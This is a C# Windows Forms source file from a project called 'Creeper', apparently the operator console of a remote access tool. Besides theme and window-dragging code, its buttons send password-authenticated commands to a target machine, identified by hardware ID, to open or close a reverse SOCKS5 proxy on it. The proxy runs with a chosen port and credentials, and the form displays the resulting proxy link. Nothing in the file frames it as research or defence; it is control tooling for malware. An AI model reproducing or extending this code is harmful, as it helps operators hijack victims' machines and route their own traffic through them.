using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Creeper.Properties;
using Creeper.TCPSocket;
using MessagePack;

namespace Creeper.singleForms
{
    public partial class singleFormReverseProxy : Form
    {
        public string HWID { get; set; }

        public singleFormReverseProxy()
        {
            InitializeComponent();
            SetTheme();
        }

        #region Theme

        private void SetTheme()
        {
            var darkTheme = Settings.Default.darkTheme;

            var colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            var colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            labelCreeper.BackColor = colorSide;
            labelCreeper.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;

            toolStripStatusLabelcopy.Image = darkTheme ? Resources.copy : Resources.copy_dark;

            statusStrip.BackColor = colorSide;
            statusStrip.ForeColor = colorText;

            buttonStart.BackColor = colorSide;
            buttonStart.ForeColor = colorText;

            buttonStop.BackColor = colorSide;
            buttonStop.ForeColor = colorText;
        }

        #endregion

        #region Move

        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);

        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;

        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }

        private void labelCreeper_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }

        #endregion


        private void buttonclose_Click(object sender, EventArgs e)
        {
            if (HWID != null)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "reverseproxyClose";
                pack.ForcePathObject("TargetClient").AsString = HWID;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }

            Close();
        }

        private void toolStripStatusLabelcopy_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(toolStripStatusLabellink.Text);
        }

        private void buttonStart_Click(object sender, EventArgs e)
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "reverseproxy";
            pack.ForcePathObject("TargetClient").AsString = HWID;
            pack.ForcePathObject("Socks5Port").AsString= textBoxSocks5Port.Text;
            pack.ForcePathObject("User").AsString= textBoxUserName.Text;
            pack.ForcePathObject("Password").AsString= textBoxPassword.Text;
            pack.ForcePathObject("WebHostPort").AsString= textBoxWebHostPort.Text;

            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Type").AsString = "Controler";
            msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
            msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
            msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
            ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());

            toolStripStatusLabellink.Text = "SOCKS5://" + Settings.Default.IP + ":" + textBoxSocks5Port.Text;
        }

        private void buttonStop_Click(object sender, EventArgs e)
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "reverseproxyClose";
            pack.ForcePathObject("TargetClient").AsString = HWID;

            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Type").AsString = "Controler";
            msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
            msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
            msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
            ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
        }
    }
}